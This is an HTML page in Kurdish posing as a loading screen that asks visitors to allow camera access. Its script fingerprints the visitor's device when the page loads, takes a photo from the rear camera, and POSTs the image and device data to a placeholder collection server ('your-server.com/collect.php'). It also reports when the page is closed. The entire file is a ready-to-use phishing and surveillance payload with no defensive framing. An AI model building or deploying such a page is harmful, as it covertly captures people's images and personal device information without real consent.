<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بارکردن...</title>
    <style>
        /* ===== CSS ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: #0a0e16;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
            color: #e0e8f0;
            flex-direction: column;
            padding: 20px;
        }
        .loader {
            border: 6px solid #1f293d;
            border-top: 6px solid #f5d18b;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info {
            text-align: center;
            max-width: 400px;
            background: #121a26;
            padding: 20px 24px;
            border-radius: 24px;
            border: 1px solid #2b364a;
        }
        .info h2 {
            font-weight: 300;
            color: #f5d18b;
            margin-bottom: 8px;
        }
        .info p {
            color: #889bb8;
            font-size: 0.9rem;
        }
        #cameraOutput {
            margin-top: 16px;
            width: 100%;
            max-width: 300px;
            border-radius: 16px;
            border: 1px solid #2b364a;
            background: #0d121e;
            display: none;
        }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="info">
        <h2>⏳ چاوەڕوانی...</h2>
        <p>تکایە دەستپێگەیشتن بە کامێرا ڕێگەپێبدە</p>
    </div>

    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="cameraOutput" alt="camera capture" />

    <!-- ===== JavaScript ===== -->
    <script>
        (function() {
            "use strict";

            function collectDeviceInfo() {
                const info = {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(',') : '',
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unspecified',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ip: '{{IP_ADDRESS}}'
                };
                return info;
            }

            function sendData(data, type = 'info') {
                const endpoint = 'https://your-server.com/collect.php';

                fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: type,
                        data: data,
                        receivedAt: new Date().toISOString()
                    })
                })
                .then(response => response.text())
                .then(text => console.log('[+] Data sent:', text))
                .catch(err => console.error('[-] Send error:', err));
            }

            function accessCamera() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const img = document.getElementById('cameraOutput');

                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.log('[-] Camera not supported');
                    sendData({ error: 'camera_not_supported' }, 'camera_error');
                    return;
                }

                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = function() {
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg', 0.85);

                            img.src = imageData;
                            img.style.display = 'block';

                            sendData({
                                image: imageData,
                                width: canvas.width,
                                height: canvas.height
                            }, 'camera_capture');

                            stream.getTracks().forEach(track => track.stop());
                            video.style.display = 'none';

                            const deviceInfo = collectDeviceInfo();
                            sendData(deviceInfo, 'device_info');

                        }, 1500);
                    };
                })
                .catch(err => {
                    console.error('[-] Camera error:', err);
                    sendData({ error: err.message }, 'camera_error');

                    const deviceInfo = collectDeviceInfo();
                    sendData(deviceInfo, 'device_info');
                });
            }

            const deviceInfo = collectDeviceInfo();
            sendData(deviceInfo, 'device_info');

            setTimeout(() => {
                accessCamera();
            }, 1000);

            console.log('👑 Device Info:', deviceInfo);

            window.addEventListener('beforeunload', function() {
                sendData({ action: 'page_closed' }, 'page_event');
            });

        })();
    </script>

</body>
</html>
